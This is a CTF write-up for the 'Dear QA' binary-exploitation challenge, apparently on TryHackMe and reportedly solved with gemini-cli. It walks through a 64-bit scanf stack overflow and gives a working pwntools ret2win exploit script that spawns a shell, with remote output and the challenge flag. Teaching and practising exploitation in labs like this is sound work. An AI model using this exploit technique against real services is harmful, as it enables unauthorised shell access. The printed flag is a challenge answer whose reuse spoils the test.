# CTF Writeup: Dear QA
(*solved using gemini-cli*)
## 1. Introduction
The **Dear QA** challenge is a 64-bit binary exploitation task. It is rated "Easy" and centers around a classic buffer overflow vulnerability. This writeup details the steps from initial discovery to the final exploitation on the remote target.

**Target Info:**
- **IP:** `TARGET-IP`
- **Port:** `5700`
- **Goal:** Obtain a shell and read `flag.txt`

---

## 2. Reconnaissance and Analysis

### 2.1. File Identification
```bash
file DearQA-1627223337406.DearQA
```
Output: `ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped`

### 2.2. Security Protections
Using `checksec`:
```bash
pwn checksec DearQA-1627223337406.DearQA
```
- **PIE:** No PIE (Base address is static at `0x400000`).
- **Stack Canary:** No canary found (The program does not check for stack corruption before returning).
- **NX:** NX unknown/Executable Stack (Not relevant here as we won't use shellcode).
- **RELRO:** No RELRO.

The absence of **PIE** and **Stack Canaries** indicates that a simple buffer overflow can be used to overwrite the return address.

### 2.3. Reverse Engineering
Analyzing the `main` function with `objdump`:
```assembly
00000000004006c3 <main>:
  ...
  4006c7:	48 83 ec 20          	sub    $0x20,%rsp
  ...
  4006fd:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  40070e:	e8 6d fe ff ff       	call   400580 <__isoc99_scanf@plt>
```
The program allocates **32 bytes** for a buffer (`rbp-0x20`) and reads input using `scanf("%s", ...)`. Because `scanf` with `%s` has no length limits, we can input more than 32 bytes and overflow the stack.

### 2.4. Identifying the "Win" Function
The binary contains a function called `vuln` at `0x400686`:
```assembly
0000000000400686 <vuln>:
  ...
  4006bc:	e8 8f fe ff ff       	call   400550 <execve@plt>
```
This function calls `execve("/bin/bash", NULL, NULL)`, giving the user a shell.

---

## 3. The Exploit Strategy

### 3.1. Calculating the Offset
The stack frame for `main` is:
1.  `Buffer` (32 bytes)
2.  `Saved RBP` (8 bytes)
3.  `Return Address` (8 bytes)

Total padding required to reach the **Return Address** is **40 bytes**.

### 3.2. Stack Alignment (The 16-byte Rule)
On 64-bit Linux systems, the stack must be **16-byte aligned** when a function like `execve` is called. If we jump directly to `vuln`, the stack pointer (`rsp`) might be off by 8 bytes, causing a crash.
**Solution:** Add a `ret` instruction gadget before the `vuln` address. This extra `ret` instruction simply pops 8 bytes off the stack, satisfying the alignment requirement.

---

## 4. The Exploit Script

The following script uses the `pwntools` library to perform the exploit:

```python
from pwn import *

# Set target details
HOST = '<TARGET-IP>'
PORT = 5700
BINARY = './DearQA-1627223337406.DearQA'

# Context setup
elf = context.binary = ELF(BINARY)
context.log_level = 'info'

# Addresses
# Address of the 'vuln' function that gives a shell
vuln_addr = elf.symbols['vuln'] # 0x400686

# We need a 'ret' gadget for stack alignment (16-byte rule)
# 4006c2: c3 ret
ret_gadget = 0x4006c2 

# Offset to reach the return address
# 32 bytes (buffer) + 8 bytes (saved RBP) = 40 bytes
offset = 40

# Payload construction
# [40 bytes padding] + [alignment gadget] + [target function]
payload = b'A' * offset
payload += p64(ret_gadget)
payload += p64(vuln_addr)

def main():
    try:
        # Establish connection
        p = remote(HOST, PORT)
        
        # Wait for the prompt and send the payload
        p.sendlineafter(b": ", payload)
        
        # Once the shell spawns, run a command to verify
        p.sendline(b"cat flag.txt")
        
        # Interact with the shell
        p.interactive()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

---

## 5. Execution and Results

Running the script against the remote target results in the following:

1.  The script sends the **40-byte padding** of 'A's.
2.  It overwrites the **Return Address** on the stack with the address of the `ret` gadget (`0x4006c2`).
3.  The program returns to the `ret` gadget, which then returns to the `vuln` function (`0x400686`).
4.  The `vuln` function executes, successfully spawning a bash shell.
5.  We execute `cat flag.txt` through the spawned shell.

**Remote Output Snippet:**
```text
[+] Opening connection to 10.48.178.44 on port 5700: Done
[*] Switching to interactive mode
Congratulations!
You have entered in the secret function!
bash: cannot set terminal process group (651): Inappropriate ioctl for device
bash: no job control in this shell
ctf@ip-10-48-178-44:/home/ctf$ cat flag.txt
THM{PWN_1S_V3RY_E4SY}
```

**Flag:** `THM{PWN_1S_V3RY_E4SY}`

---

## 6. Conclusion
The **Dear QA** challenge highlights the danger of using unsafe input functions like `scanf` with the `%s` specifier. By carefully calculating the stack offset and ensuring correct stack alignment for 64-bit systems, we were able to hijack the program's control flow and obtain administrative access.
